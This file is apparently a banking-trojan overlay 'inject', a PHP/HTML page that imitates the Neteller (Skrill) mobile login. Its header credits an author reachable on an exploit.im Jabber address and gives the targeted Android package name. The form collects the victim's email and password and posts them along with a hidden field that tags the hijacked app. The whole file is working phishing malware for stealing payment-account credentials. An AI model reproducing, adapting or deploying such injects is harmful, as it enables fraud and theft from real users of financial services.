<!-- Information
Author: Validolik
Jabber: validol@exploit.im
Inject: com.moneybookers.skrillpayments.neteller
Stages: 1
Version: 2.2.0-neteller
Last Update: 26.05.2017
-->
<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">

</head>
<body>
<div id="content_div">
<center>
<img src="libs/images/logo.png">
<br><br>
<div class="col-xs-10 col-sm-8">
		<form method="post" >
			
			<input name="field2" id="login" placeholder="Email Address" onkeyup="check();" class="input" type="email"><br><br>
			<input name="field3" id="password" placeholder="Password" onkeyup="check();" class="input" type="password"><br><br>

			<input value="LOGIN" id="input_submitBtn" disabled="disabled" class="submit" type="submit">
			
		 <input name="field1" value="com.moneybookers.skrillpayments.neteller" type="hidden">

		</form>
		<script>
			function check() {
			  var inp1 = document.getElementById('login'),
				  inp2 = document.getElementById('password');
			  document.getElementById('input_submitBtn').disabled = inp1.value && inp2.value ? false : "disabled";
			};
		</script>
</div>
<center>
</div>
</body>
</html>